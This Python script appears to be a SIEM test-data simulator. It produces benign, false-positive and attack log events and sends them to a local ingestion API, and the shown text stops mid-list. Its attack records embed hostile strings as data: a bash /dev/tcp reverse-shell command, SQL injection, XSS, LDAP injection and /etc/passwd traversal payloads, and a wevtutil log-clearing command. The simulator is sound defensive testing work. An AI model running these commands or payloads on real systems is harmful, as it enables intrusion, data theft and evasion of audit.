#!/usr/bin/env python3
"""
SIEM Continuous Log Simulator Daemon.

Generates a continuous stream of benign logs, false positives, and malicious 
attack patterns (true positives) and ingests them into the SIEM pipeline.
Runs with zero external dependencies (using standard urllib.request).
"""

import argparse
import datetime
import json
import random
import sys
import time
import urllib.request
import urllib.error

original_datetime = datetime.datetime

# ANSI Color Codes
GREEN = "\033[92m"
YELLOW = "\033[93m"
RED = "\033[91m"
CYAN = "\033[96m"
MAGENTA = "\033[95m"
BLUE = "\033[94m"
RESET = "\033[0m"
BOLD = "\033[1m"


# Helper pools of data
USER_POOL = ["john.doe", "alice.smith", "bob.johnson", "charlie.brown", "david.miller", "admin", "root", "db_admin"]
IP_POOL = [f"192.168.1.{i}" for i in range(10, 100)] + [f"10.0.0.{i}" for i in range(50, 150)]
# Generate 150 unique random public IPs
def _generate_external_ips(count=150):
    ips = []
    r = random.Random(42)  # Seed for deterministic set of IPs across runs
    while len(ips) < count:
        first = r.randint(1, 223)
        if first in (10, 127, 169, 172, 192):
            continue
        ip = f"{first}.{r.randint(1, 254)}.{r.randint(1, 254)}.{r.randint(1, 254)}"
        if ip not in ips:
            ips.append(ip)
    return ips

EXTERNAL_IP_POOL = _generate_external_ips(150)
EXTERNAL_IP_BENIGN = EXTERNAL_IP_POOL[0:50]
EXTERNAL_IP_MEDIUM = EXTERNAL_IP_POOL[50:90]
EXTERNAL_IP_HIGH = EXTERNAL_IP_POOL[90:130]
EXTERNAL_IP_CRITICAL = EXTERNAL_IP_POOL[130:150]

# Dynamic hook to return specific IP ranges based on caller attack severity
_original_choice = random.choice
def custom_choice(seq):
    if seq is EXTERNAL_IP_POOL:
        import inspect
        frame = inspect.currentframe().f_back
        caller_name = frame.f_code.co_name
        if any(kw in caller_name for kw in ["wannacry", "ransomware", "reverse_shell", "c2", "exfiltration", "deletion", "kubernetes", "malware"]):
            return _original_choice(EXTERNAL_IP_CRITICAL)
        elif any(kw in caller_name for kw in ["sqli", "xss", "brute_force", "credential", "traversal", "ldap", "dns", "phishing", "tor"]):
            return _original_choice(EXTERNAL_IP_HIGH)
        else:
            return _original_choice(EXTERNAL_IP_MEDIUM)
    return _original_choice(seq)
random.choice = custom_choice
WEB_PATHS = ["/index.html", "/products/12", "/api/v1/search", "/login.php", "/contact", "/about", "/static/js/main.js"]
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
]

# Simulated time control to distribute events realistically across the last 24 hours
SIMULATED_TIME = None

class SimulatedDatetime(original_datetime):
    @classmethod
    def now(cls, tz=None):
        if SIMULATED_TIME is not None:
            if tz is not None:
                return SIMULATED_TIME.replace(tzinfo=tz)
            return SIMULATED_TIME
        return original_datetime.now(tz)

datetime.datetime = SimulatedDatetime

def get_utc_now():
    return datetime.datetime.now(datetime.timezone.utc).replace(tzinfo=None).isoformat() + "Z"

# --- Benign Event Generators ---
def gen_benign_auth():
    user = random.choice(USER_POOL)
    ip = random.choice(EXTERNAL_IP_BENIGN) if random.random() < 0.3 else random.choice(IP_POOL)
    return {
        "event_type": "auth",
        "severity": "INFO",
        "message": f"sshd[12942]: Accepted password for {user} from {ip} port {random.randint(49152, 65535)} ssh2",
        "raw_payload": f"{get_utc_now()} server sshd[12942]: Accepted password for {user} from {ip}",
        "source_ip": ip,
        "destination_ip": "10.0.0.5",
        "source_port": random.randint(49152, 65535),
        "destination_port": 22,
        "user_id": user,
        "user_agent": "SSH-2.0-OpenSSH_8.2p1",
        "timestamp": get_utc_now()
    }

def gen_benign_web():
    ip = random.choice(EXTERNAL_IP_BENIGN) if random.random() < 0.3 else random.choice(IP_POOL)
    path = random.choice(WEB_PATHS)
    return {
        "event_type": "web",
        "severity": "INFO",
        "message": f"Web server access: GET {path} HTTP/1.1 from {ip}",
        "raw_payload": f"GET {path} HTTP/1.1\nHost: company.local\nUser-Agent: {random.choice(USER_AGENTS)}\nIP: {ip}",
        "source_ip": ip,
        "destination_ip": "10.0.0.80",
        "source_port": random.randint(49152, 65535),
        "destination_port": 443,
        "user_id": random.choice(USER_POOL),
        "user_agent": random.choice(USER_AGENTS),
        "timestamp": get_utc_now()
    }

def gen_benign_system():
    return {
        "event_type": "system",
        "severity": "INFO",
        "message": f"System status update: disk space utilization at {random.randint(20, 65)}%",
        "raw_payload": f"systemd[1]: Started Periodic Command Scheduler.",
        "source_ip": "127.0.0.1",
        "destination_ip": "127.0.0.1",
        "user_agent": "System Agent",
        "timestamp": get_utc_now()
    }

def gen_benign_firewall():
    src_ip = random.choice(EXTERNAL_IP_BENIGN) if random.random() < 0.3 else random.choice(IP_POOL)
    dst_ip = f"8.8.8.{random.randint(1, 8)}"
    port = random.choice([53, 80, 443])
    return {
        "event_type": "firewall",
        "severity": "INFO",
        "message": f"Firewall allowed outbound packet from {src_ip} to {dst_ip}:{port}",
        "raw_payload": f"rule=101 action=allow src={src_ip} dst={dst_ip} proto=tcp dport={port}",
        "source_ip": src_ip,
        "destination_ip": dst_ip,
        "source_port": random.randint(49152, 65535),
        "destination_port": port,
        "user_agent": "Firewall Agent",
        "timestamp": get_utc_now()
    }

# --- False Positive Event Generators ---
def gen_fp_sqli():
    # Looks like SQL in the search term, triggers regex but is benign user query
    ip = random.choice(IP_POOL)
    search_queries = [
        "O'Connor's Irish Union",
        "select a color",
        "UNION trade union membership criteria",
        "order by number 1 or 2"
    ]
    query = random.choice(search_queries)
    return {
        "event_type": "web",
        "severity": "INFO",
        "message": f"Search input received: {query}",
        "raw_payload": f"GET /search?q={query} HTTP/1.1\nHost: company.local\nUser-Agent: {random.choice(USER_AGENTS)}\nIP: {ip}",
        "source_ip": ip,
        "destination_ip": "10.0.0.80",
        "source_port": random.randint(49152, 65535),
        "destination_port": 443,
        "user_id": random.choice(USER_POOL),
        "user_agent": random.choice(USER_AGENTS),
        "timestamp": get_utc_now()
    }

def gen_fp_xss():
    # User sharing code snippet that contains tags, triggers XSS rule but is benign forum/chat post
    ip = random.choice(IP_POOL)
    code_snippets = [
        "In JavaScript, write <script>console.log('hello')</script> to test.",
        "To load an image with error fallback, use: <img src=x onerror=handleError()>"
    ]
    post_body = random.choice(code_snippets)
    return {
        "event_type": "web",
        "severity": "INFO",
        "message": f"Forum post submitted: {post_body}",
        "raw_payload": f"POST /api/v1/posts HTTP/1.1\nHost: company.local\nContent-Type: application/json\nIP: {ip}\n\n{{\"body\": \"{post_body}\"}}",
        "source_ip": ip,
        "destination_ip": "10.0.0.80",
        "source_port": random.randint(49152, 65535),
        "destination_port": 443,
        "user_id": random.choice(USER_POOL),
        "user_agent": random.choice(USER_AGENTS),
        "timestamp": get_utc_now()
    }

def gen_fp_scan():
    # Admin pinging resources, matches rule pattern 'ping' but is standard health monitoring
    ip = "10.0.0.10" # Static internal monitoring node
    return {
        "event_type": "system",
        "severity": "INFO",
        "message": f"Network health check: pinging domain controller 10.0.0.2 successful",
        "raw_payload": f"mon-service: ping latency to 10.0.0.2 is 2ms",
        "source_ip": ip,
        "destination_ip": "10.0.0.2",
        "user_agent": "Internal Monitor Agent",
        "timestamp": get_utc_now()
    }

# --- True Positive Attack Scenario Sequence Generators ---
def gen_tp_brute_force():
    # Generates 5 rapid failed login events from a single IP to trigger rule
    attacker_ip = random.choice(EXTERNAL_IP_POOL)
    target_user = "admin"
    logs = []
    base_time = datetime.datetime.now(datetime.timezone.utc).replace(tzinfo=None) - datetime.timedelta(seconds=5)
    for i in range(5):
        ts = (base_time + datetime.timedelta(seconds=i)).isoformat() + "Z"
        logs.append({
            "event_type": "auth",
            "severity": "WARNING",
            "message": f"sshd[28451]: Failed password for invalid user {target_user} from {attacker_ip} port {50000+i} ssh2",
            "raw_payload": f"{ts} server sshd[28451]: Failed password for invalid user {target_user} from {attacker_ip}",
            "source_ip": attacker_ip,
            "destination_ip": "10.0.0.15",
            "source_port": 50000 + i,
            "destination_port": 22,
            "user_id": target_user,
            "user_agent": "SSH-2.0-OpenSSH_8.2p1",
            "timestamp": ts
        })
    return logs

def gen_tp_credential_stuffing():
    # Single IP targeting multiple users
    attacker_ip = random.choice(EXTERNAL_IP_POOL)
    users = ["john", "sarah", "michael", "jessica", "david"]
    logs = []
    base_time = datetime.datetime.now(datetime.timezone.utc).replace(tzinfo=None) - datetime.timedelta(seconds=5)
    for i, user in enumerate(users):
        ts = (base_time + datetime.timedelta(seconds=i)).isoformat() + "Z"
        logs.append({
            "event_type": "auth",
            "severity": "WARNING",
            "message": f"sshd[31405]: Failed password for {user} from {attacker_ip} port 51102 ssh2",
            "raw_payload": f"{ts} server sshd[31405]: Failed password for {user} from {attacker_ip}",
            "source_ip": attacker_ip,
            "destination_ip": "10.0.0.15",
            "source_port": 51102,
            "destination_port": 22,
            "user_id": user,
            "user_agent": "SSH-2.0-Go",
            "timestamp": ts
        })
    return logs

def gen_tp_distributed_brute_force():
    # Multiple IPs targeting one user
    target_user = "root"
    ips = ["198.51.100.10", "203.0.113.25", "185.190.140.40", "95.142.100.12", "82.102.23.9"]
    logs = []
    base_time = datetime.datetime.now(datetime.timezone.utc).replace(tzinfo=None) - datetime.timedelta(seconds=5)
    for i, ip in enumerate(ips):
        ts = (base_time + datetime.timedelta(seconds=i)).isoformat() + "Z"
        logs.append({
            "event_type": "auth",
            "severity": "WARNING",
            "message": f"sshd[31200]: Failed password for {target_user} from {ip} port 38290 ssh2",
            "raw_payload": f"{ts} server sshd[31200]: Failed password for {target_user} from {ip}",
            "source_ip": ip,
            "destination_ip": "10.0.0.15",
            "source_port": 38290,
            "destination_port": 22,
            "user_id": target_user,
            "user_agent": "SSH-2.0-OpenSSH_8.0",
            "timestamp": ts
        })
    return logs

def gen_tp_sqli():
    attacker_ip = random.choice(EXTERNAL_IP_POOL)
    return [{
        "event_type": "web",
        "severity": "ERROR",
        "message": f"WAF: SQL Injection detected on login page payload: ' OR '1'='1",
        "raw_payload": f"GET /login.php?user=admin' OR '1'='1&pass=test HTTP/1.1\nHost: securebank.com\nUser-Agent: sqlmap/1.4\nIP: {attacker_ip}",
        "source_ip": attacker_ip,
        "destination_ip": "10.0.0.80",
        "source_port": 52143,
        "destination_port": 443,
        "user_id": "guest",
        "user_agent": "sqlmap/1.4.12#stable",
        "timestamp": get_utc_now()
    }]

def gen_tp_xss():
    attacker_ip = random.choice(EXTERNAL_IP_POOL)
    return [{
        "event_type": "web",
        "severity": "ERROR",
        "message": f"WAF: Cross-Site Scripting (XSS) payload: <script>alert(document.cookie)</script>",
        "raw_payload": f"POST /api/v1/comments HTTP/1.1\nHost: company.local\nIP: {attacker_ip}\nUser-Agent: Mozilla/5.0\n\n{{\"comment\": \"<script>alert(1)</script>\"}}",
        "source_ip": attacker_ip,
        "destination_ip": "10.0.0.80",
        "source_port": 53210,
        "destination_port": 443,
        "user_id": "guest",
        "user_agent": "Mozilla/5.0",
        "timestamp": get_utc_now()
    }]

def gen_tp_port_scan():
    # Consecutive blocks with scan/nmap in firewall message
    attacker_ip = random.choice(EXTERNAL_IP_POOL)
    ports = [21, 22, 23, 25, 80, 110, 443, 8080]
    logs = []
    base_time = datetime.datetime.now(datetime.timezone.utc).replace(tzinfo=None) - datetime.timedelta(seconds=4)
    for i, port in enumerate(ports):
        ts = (base_time + datetime.timedelta(seconds=i * 0.5)).isoformat() + "Z"
        logs.append({
            "event_type": "firewall",
            "severity": "INFO",
            "message": f"Firewall blocked nmap scanning attempt from {attacker_ip} to port {port}",
            "raw_payload": f"rule=104 action=block src={attacker_ip} dst=10.0.0.5 proto=tcp sport=54321 dport={port}",
            "source_ip": attacker_ip,
            "destination_ip": "10.0.0.5",
            "source_port": 54321,
            "destination_port": port,
            "user_agent": "Nmap Scripting Engine",
            "timestamp": ts
        })
    return logs

def gen_tp_malware():
    attacker_ip = random.choice(EXTERNAL_IP_POOL)
    return [{
        "event_type": "system",
        "severity": "CRITICAL",
        "message": f"Antivirus Alert: Trojan backdoor activity detected on host 10.0.0.15. Signature: Trojan.Win32.ReverseShell.a",
        "raw_payload": f"Antivirus engine flagged local file execution: C:\\Users\\Public\\shell.exe running under system context, establishing external connection to command-and-control server at {attacker_ip}.",
        "source_ip": attacker_ip,
        "destination_ip": "10.0.0.15",
        "source_port": 4444,
        "destination_port": 443,
        "user_id": "system",
        "user_agent": "Antivirus Agent v4.1",
        "timestamp": get_utc_now()
    }]

def gen_tp_policy_violation():
    return [{
        "event_type": "auth",
        "severity": "WARNING",
        "message": f"Security Policy Violation: Unauthorized administrative privilege escalation attempt by user john.doe.",
        "raw_payload": f"User john.doe executed 'sudo su -' without authorization. Action logged as security policy bypass in system audit configuration.",
        "source_ip": "10.0.0.102",
        "destination_ip": "10.0.0.15",
        "source_port": 58210,
        "destination_port": 22,
        "user_id": "john.doe",
        "user_agent": "Bash / Sudo Audit",
        "timestamp": get_utc_now()
    }]

def gen_tp_directory_traversal():
    attacker_ip = random.choice(EXTERNAL_IP_POOL)
    return [{
        "event_type": "web",
        "severity": "ERROR",
        "message": f"WAF: Directory Traversal attack attempt from {attacker_ip} searching /etc/passwd",
        "raw_payload": f"GET /../../../../etc/passwd HTTP/1.1\nHost: company.local\nIP: {attacker_ip}\nUser-Agent: Nikto/2.1",
        "source_ip": attacker_ip,
        "destination_ip": "10.0.0.80",
        "source_port": 49201,
        "destination_port": 443,
        "user_id": "guest",
        "user_agent": "Nikto/2.1.5",
        "timestamp": get_utc_now()
    }]

def gen_tp_root_ssh_login():
    attacker_ip = random.choice(EXTERNAL_IP_POOL)
    return [{
        "event_type": "auth",
        "severity": "WARNING",
        "message": f"sshd[31201]: Failed password for invalid user root from {attacker_ip} port 49100 ssh2",
        "raw_payload": f"sshd[31201]: Failed password for invalid user root from {attacker_ip}",
        "source_ip": attacker_ip,
        "destination_ip": "10.0.0.2",
        "source_port": 49100,
        "destination_port": 22,
        "user_id": "root",
        "user_agent": "SSH-2.0-OpenSSH_8.0",
        "timestamp": get_utc_now()
    }]

def gen_tp_ransomware_staged():
    attacker_ip = random.choice(EXTERNAL_IP_POOL)
    return [{
        "event_type": "system",
        "severity": "CRITICAL",
        "message": f"Antivirus Alert: Staging of ransomware file payload cryptolocker.encrypt detected on 10.0.0.15.",
        "raw_payload": f"System AV detected staged execution: C:\\Users\\Public\\cryptolocker.encrypt. Ransomware signature match.",
        "source_ip": attacker_ip,
        "destination_ip": "10.0.0.15",
        "source_port": 4444,
        "destination_port": 443,
        "user_id": "administrator",
        "user_agent": "Antivirus Agent v4.1",
        "timestamp": get_utc_now()
    }]

def gen_tp_ldap_injection():
    attacker_ip = random.choice(EXTERNAL_IP_POOL)
    return [{
        "event_type": "web",
        "severity": "ERROR",
        "message": f"WAF: LDAP Injection query detected in web form input: *(objectClass=*) from {attacker_ip}",
        "raw_payload": f"POST /api/v1/users HTTP/1.1\nHost: company.local\nPayload: user=*(objectClass=*)\nIP: {attacker_ip}",
        "source_ip": attacker_ip,
        "destination_ip": "10.0.0.80",
        "source_port": 50110,
        "destination_port": 443,
        "user_id": "guest",
        "user_agent": "Mozilla/5.0",
        "timestamp": get_utc_now()
    }]

def gen_tp_dns_tunneling():
    return [{
        "event_type": "firewall",
        "severity": "WARNING",
        "message": "Firewall Alert: DNS Tunneling exfiltration signature match: high frequency query rate detected on 10.0.0.50.",
        "raw_payload": "rule=110 action=alert src=10.0.0.50 dst=8.8.8.8 query=exfil.v1.domain.com. policy violation",
        "source_ip": "10.0.0.50",
        "destination_ip": "8.8.8.8",
        "source_port": 59300,
        "destination_port": 53,
        "user_id": "system",
        "user_agent": "Firewall Agent",
        "timestamp": get_utc_now()
    }]

def gen_tp_phishing_download():
    return [{
        "event_type": "web",
        "severity": "ERROR",
        "message": "Gateway Proxy: Phishing payload trojan downloader matched: security-update-verification.com/payload.exe",
        "raw_payload": "GET /payload.exe HTTP/1.1\nHost: security-update-verification.com\nIP: 10.0.0.60\nMalware Signature Detected",
        "source_ip": "10.0.0.60",
        "destination_ip": "198.51.100.5",
        "source_port": 52140,
        "destination_port": 80,
        "user_id": "alice.smith",
        "user_agent": "Mozilla/5.0",
        "timestamp": get_utc_now()
    }]

def gen_tp_tor_exit_node():
    return [{
        "event_type": "firewall",
        "severity": "WARNING",
        "message": "Firewall Action Block: Traffic detected from known Tor exit node IP 185.220.101.5 to internal proxy gateway.",
        "raw_payload": "rule=120 action=block src=185.220.101.5 dst=10.0.0.100 policy violation tor exit route",
        "source_ip": "185.220.101.5",
        "destination_ip": "10.0.0.100",
        "source_port": 55102,
        "destination_port": 443,
        "user_id": "system",
        "user_agent": "Tor Ingress Monitor",
        "timestamp": get_utc_now()
    }]

def gen_tp_unauthorized_api():
    attacker_ip = random.choice(EXTERNAL_IP_POOL)
    return [{
        "event_type": "web",
        "severity": "WARNING",
        "message": f"Web Gateway: 403 Forbidden unauthorized admin API key access attempt on /api/v1/admin from {attacker_ip}",
        "raw_payload": f"GET /api/v1/admin HTTP/1.1\nAuthorization: Bearer invalidKey\nIP: {attacker_ip}\nResult: Unauthorized Access",
        "source_ip": attacker_ip,
        "destination_ip": "10.0.0.80",
        "source_port": 54100,
        "destination_port": 443,
        "user_id": "guest",
        "user_agent": "curl/7.81.0",
        "timestamp": get_utc_now()
    }]

def gen_tp_ddos_syn():
    attacker_ip = random.choice(EXTERNAL_IP_POOL)
    return [{
        "event_type": "firewall",
        "severity": "WARNING",
        "message": f"IDS Alert: DDoS SYN Flood attack signature matched from {attacker_ip}. Traffic threshold exceeded on Port 80.",
        "raw_payload": f"firewall_sensor: action=alert src={attacker_ip} dst=10.0.0.5 proto=tcp flags=SYN count=1200",
        "source_ip": attacker_ip,
        "destination_ip": "10.0.0.5",
        "source_port": 64320,
        "destination_port": 80,
        "user_id": "system",
        "user_agent": "IDS Sensor 01",
        "timestamp": get_utc_now()
    }]

def gen_tp_registry_tampering():
    return [{
        "event_type": "system",
        "severity": "CRITICAL",
        "message": "Sysmon Alert: Windows Registry tampering detected: Trojan persistent backdoor injected in Run registry key.",
        "raw_payload": "Registry Key Added: HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Backdoor path: C:\\temp\\shell.exe",
        "source_ip": "10.0.0.2",
        "destination_ip": "10.0.0.2",
        "source_port": 0,
        "destination_port": 0,
        "user_id": "system",
        "user_agent": "Sysmon Agent 14.1",
        "timestamp": get_utc_now()
    }]

def gen_tp_sensitive_file_access():
    return [{
        "event_type": "system",
        "severity": "CRITICAL",
        "message": "OS Audit: Sensitive system file accessed: unauthorized read on /etc/shadow by user bob.johnson.",
        "raw_payload": "auditd: event=READ path=/etc/shadow user=bob.johnson result=success policy violation",
        "source_ip": "10.0.0.15",
        "destination_ip": "10.0.0.15",
        "source_port": 0,
        "destination_port": 0,
        "user_id": "bob.johnson",
        "user_agent": "Linux Auditd",
        "timestamp": get_utc_now()
    }]

def gen_tp_kubernetes_priv_bypass():
    return [{
        "event_type": "system",
        "severity": "HIGH",
        "message": "Kubernetes Audit: ClusterRoleBinding created by system:anonymous. Potential privilege escalation bypass.",
        "raw_payload": "Kube-API: POST /apis/rbac.authorization.k8s.io/v1/clusterrolebindings user=system:anonymous status=201",
        "source_ip": "10.0.0.100",
        "destination_ip": "10.0.0.100",
        "source_port": 6443,
        "destination_port": 6443,
        "user_id": "system:anonymous",
        "user_agent": "Kubelet Client",
        "timestamp": get_utc_now()
    }]

def gen_tp_log_deletion():
    return [{
        "event_type": "system",
        "severity": "CRITICAL",
        "message": "OS Audit: System event log deletion attempt: event log cleared using wevtutil command by admin.",
        "raw_payload": "wevtutil.exe cl Security policy violation log cleared command executed by admin.",
        "source_ip": "10.0.0.2",
        "destination_ip": "10.0.0.2",
        "source_port": 0,
        "destination_port": 0,
        "user_id": "admin",
        "user_agent": "Powershell Host",
        "timestamp": get_utc_now()
    }]

def gen_tp_c2_contact():
    attacker_ip = random.choice(EXTERNAL_IP_POOL)
    return [{
        "event_type": "firewall",
        "severity": "CRITICAL",
        "message": f"IDS Alert: Command & Control (C2) contact matched: periodic outbound beaconing to malicious IP {attacker_ip}.",
        "raw_payload": f"ids_sensor: action=alert src=10.0.0.15 dst={attacker_ip} proto=tcp dport=4444 signature=cnc contact",
        "source_ip": "10.0.0.15",
        "destination_ip": attacker_ip,
        "source_port": 49102,
        "destination_port": 4444,
        "user_id": "system",
        "user_agent": "IDS Engine 2.0",
        "timestamp": get_utc_now()
    }]

def gen_tp_reverse_shell():
    attacker_ip = random.choice(EXTERNAL_IP_POOL)
    return [{
        "event_type": "system",
        "severity": "CRITICAL",
        "message": f"Sysmon Alert: Reverse shell connection spawned: active bash terminal pointing to external IP {attacker_ip}.",
        "raw_payload": f"Process Created: /bin/bash -i >& /dev/tcp/{attacker_ip}/4444 0>&1 run under user root",
        "source_ip": "10.0.0.15",
        "destination_ip": attacker_ip,
        "source_port": 49120,
        "destination_port": 4444,
        "user_id": "root",
        "user_agent": "Sysmon Linux",
        "timestamp": get_utc_now()
    }]

def gen_tp_suspicious_rdp():
    attacker_ip = random.choice(EXTERNAL_IP_POOL)
    return [{
        "event_type": "auth",
        "severity": "HIGH",
        "message": f"Windows Security: Suspicious RDP Session established outside business hours from {attacker_ip} by root.",
        "raw_payload": f"EventID 4624 LogonType 10 RDP connection allowed from {attacker_ip} to 10.0.0.2 unauthorized access",
        "source_ip": attacker_ip,
        "destination_ip": "10.0.0.2",
        "source_port": 50123,
        "destination_port": 3389,
        "user_id": "root",
        "user_agent": "RDP Client",
        "timestamp": get_utc_now()
    }]

def gen_tp_data_exfiltration_ftp():
    attacker_ip = random.choice(EXTERNAL_IP_POOL)
    return [{
        "event_type": "firewall",
        "severity": "HIGH",
        "message": f"IDS Alert: Potential data exfiltration via FTP: huge outbound payload (1.2GB) transferred to {attacker_ip}.",
        "raw_payload": f"firewall_rule: action=allow src=10.0.0.15 dst={attacker_ip} bytes_sent=1280000000 dport=21 policy violation",
        "source_ip": "10.0.0.15",
        "destination_ip": attacker_ip,
        "source_port": 50400,
        "destination_port": 21,
        "user_id": "db_admin",
        "user_agent": "FTP Client",
        "timestamp": get_utc_now()
    }]

def gen_tp_wannacry_prop():
    attacker_ip = random.choice(EXTERNAL_IP_POOL)
    return [{
        "event_type": "system",
        "severity": "CRITICAL",
        "message": f"Antivirus Alert: WannaCry ransomware propagation matched: scanning internal SMB Port 445 on 10.0.0.15.",
        "raw_payload": f"AV Match: malware WannaCry Ransomware signature block activity on host 10.0.0.15.",
        "source_ip": attacker_ip,
        "destination_ip": "10.0.0.15",
        "source_port": 61200,
        "destination_port": 445,
        "user_id": "system",
        "user_agent": "Antivirus Agent v4.1",
        "timestamp": get_utc_now()
    }]


# --- Main Logic ---

def send_logs(url, logs, async_mode):
    """
    Sends a list of logs to the SIEM API ingestion endpoint using standard library.
    """
    endpoint = f"{url.rstrip('/')}/api/v1/logs/ingest"
    if async_mode:
        endpoint += "?async_mode=true"

    payload = {"logs": logs}
    data = json.dumps(payload).encode("utf-8")
    
    req = urllib.request.Request(
        endpoint,
        data=data,
        headers={"Content-Type": "application/json"}
    )
    
    try:
        with urllib.request.urlopen(req, timeout=5) as res:
            res_data = json.loads(res.read().decode("utf-8"))
            return res.status, res_data
    except urllib.error.HTTPError as e:
        try:
            err_data = json.loads(e.read().decode("utf-8"))
        except Exception:
            err_data = e.reason
        return e.code, err_data
    except Exception as e:
        return 0, str(e)

def print_header(title):
    print(f"\n{BOLD}{MAGENTA}=== {title} ==={RESET}")

def main():
    global SIMULATED_TIME
    parser = argparse.ArgumentParser(description="Continuous SIEM Log Generator & Simulator")
    parser.add_argument("--url", default="http://127.0.0.1:8000", help="SIEM Backend API root URL")
    parser.add_argument("--interval", type=float, default=2.0, help="Log feed frequency (seconds)")
    parser.add_argument("--duration", type=float, default=0, help="Simulation duration (seconds, 0 for infinite)")
    parser.add_argument("--attack-ratio", type=float, default=0.20, help="Probability of triggering an attack sequence (0.0 to 1.0)")
    parser.add_argument("--async-mode", action="store_true", help="Send logs in async queue mode")
    
    args = parser.parse_args()
    
    print(f"{BOLD}{BLUE}===================================================={RESET}")
    print(f"{BOLD}{BLUE}*** Google-Ready AI-Powered SIEM Ingestion Simulator ***{RESET}")
    print(f"{BOLD}{BLUE}===================================================={RESET}")
    print(f"Target API Server   : {CYAN}{args.url}{RESET}")
    print(f"Log Interval        : {CYAN}{args.interval}s{RESET}")
    print(f"Attack Ratio        : {CYAN}{int(args.attack_ratio * 100)}%{RESET}")
    print(f"Ingestion Mode      : {CYAN}{'Asynchronous Queue' if args.async_mode else 'Synchronous Direct'}{RESET}")
    print(f"Simulation Duration : {CYAN}{'Infinite' if args.duration == 0 else f'{args.duration}s'}{RESET}\n")
    print(f"Press {BOLD}Ctrl+C{RESET} to stop simulation at any time.\n")

    start_time = time.time()
    count_benign = 0
    count_fp = 0
    count_tp = 0
    
    # Initialize loop timing variables
    last_event_time = 0
    next_interval = args.interval

    # -------------------------------------------------------------
    # HISTORICAL LOG BACKFILL ON STARTUP
    # -------------------------------------------------------------
    try:
        print(f"\n{BOLD}{CYAN}>>> Initiating historical log backfill for the last 24 hours...{RESET}")
        backfill_logs = []
        now_dt = original_datetime.now()
        
        # Generate 500 logs distributed over the last 24 hours with diurnal pattern weights
        for _ in range(500):
            hour_offset = random.choices(
                range(24), 
                weights=[12, 8, 6, 5, 4, 6, 12, 22, 35, 42, 48, 50, 46, 42, 45, 48, 52, 40, 32, 26, 20, 18, 15, 13]
            )[0]
            minute_offset = random.randint(0, 59)
            sec_offset = random.randint(0, 59)
            log_time = now_dt - datetime.timedelta(hours=hour_offset, minutes=minute_offset, seconds=sec_offset)
            
            SIMULATED_TIME = log_time
            
            roll_attack = random.random()
            if roll_attack < args.attack_ratio:
                # Malicious Attack Scenario
                attack_gen = random.choice([
                    gen_tp_brute_force, gen_tp_credential_stuffing, gen_tp_sqli, gen_tp_xss,
                    gen_tp_port_scan, gen_tp_malware, gen_tp_directory_traversal, gen_tp_c2_contact
                ])
                backfill_logs.extend(attack_gen())
            else:
                roll_fp = random.random()
                if roll_fp < 0.15:
                    fp_gen = random.choice([gen_fp_sqli, gen_fp_xss, gen_fp_scan])
                    backfill_logs.append(fp_gen())
                else:
                    benign_gen = random.choice([gen_benign_auth, gen_benign_web, gen_benign_system, gen_benign_firewall])
                    backfill_logs.append(benign_gen())
                    
        # Reset SIMULATED_TIME to None
        SIMULATED_TIME = None
        
        if backfill_logs:
            # Sort logs by timestamp ascending so they are ingested in timeline order
            backfill_logs.sort(key=lambda x: x["timestamp"])
            print(f"Sending {len(backfill_logs)} historical backfill logs to backend...")
            status, res = send_logs(args.url, backfill_logs, async_mode=False)
            if status == 201:
                print(f"{BOLD}{GREEN}Success: Backfilled {res.get('count', 0)} logs successfully.{RESET}\n")
            else:
                print(f"{BOLD}{RED}Error backfilling logs: {res} (Status {status}){RESET}\n")
    except Exception as e:
        print(f"{BOLD}{RED}Failed to complete historical backfill: {e}{RESET}\n")
    
    try:
        while True:
            now = time.time()
            # Check duration limit
            if args.duration > 0 and (now - start_time) >= args.duration:
                print(f"\n{BOLD}{GREEN}Specified duration completed. Exiting simulator.{RESET}")
                break
                
            # Throttle loop to match the random interval
            elapsed = now - last_event_time
            if elapsed < next_interval:
                time.sleep(max(0.1, next_interval - elapsed))
                continue
                
            last_event_time = time.time()
            print(f"Event triggered! Scheduling next event in {next_interval:.1f}s...")
            next_interval = max(0.5, args.interval + random.uniform(-0.5, 0.5))
            
            # Use original_datetime.now() to sync with local computer time (IST) for real-time chart updates
            SIMULATED_TIME = original_datetime.now()
            
            # Decide the number of scenarios/logs to generate based on simulated minute (even -> burst, odd -> quiet)
            sim_minute = SIMULATED_TIME.minute
            if sim_minute % 2 == 0:
                num_scenarios = random.randint(10, 18)
            else:
                num_scenarios = 1
                
            logs_to_send = []
            scenario_name = ""
            is_critical = False
            
            for step in range(num_scenarios):
                # Shift simulated time slightly for each log inside the batch
                SIMULATED_TIME += datetime.timedelta(seconds=random.randint(1, 3), milliseconds=random.randint(100, 900))
                
                # Determine if this iteration triggers an attack or a general log
                roll_attack = random.random()
                if roll_attack < args.attack_ratio:
                    is_critical = True
                    
                    # Malicious Attack Scenario (True Positive)
                    attack_type = random.choice([
                        ("SSH Brute Force", gen_tp_brute_force),
                        ("Credential Stuffing", gen_tp_credential_stuffing),
                        ("Distributed Brute Force", gen_tp_distributed_brute_force),
                        ("SQL Injection", gen_tp_sqli),
                        ("Cross-Site Scripting (XSS)", gen_tp_xss),
                        ("Port Scanning Scan", gen_tp_port_scan),
                        ("Malware Infection", gen_tp_malware),
                        ("Policy Violation", gen_tp_policy_violation),
                        ("Directory Traversal", gen_tp_directory_traversal),
                        ("Root SSH Bypass", gen_tp_root_ssh_login),
                        ("Ransomware Staging", gen_tp_ransomware_staged),
                        ("LDAP Injection", gen_tp_ldap_injection),
                        ("DNS Tunneling Exfil", gen_tp_dns_tunneling),
                        ("Phishing Download", gen_tp_phishing_download),
                        ("Tor Exit Access", gen_tp_tor_exit_node),
                        ("Unauthorized Admin API", gen_tp_unauthorized_api),
                        ("DDoS SYN Flood", gen_tp_ddos_syn),
                        ("Registry Tampering", gen_tp_registry_tampering),
                        ("Sensitive Shadow Read", gen_tp_sensitive_file_access),
                        ("Kube Privilege Bypass", gen_tp_kubernetes_priv_bypass),
                        ("System Log Deletion", gen_tp_log_deletion),
                        ("C2 Backdoor Beacon", gen_tp_c2_contact),
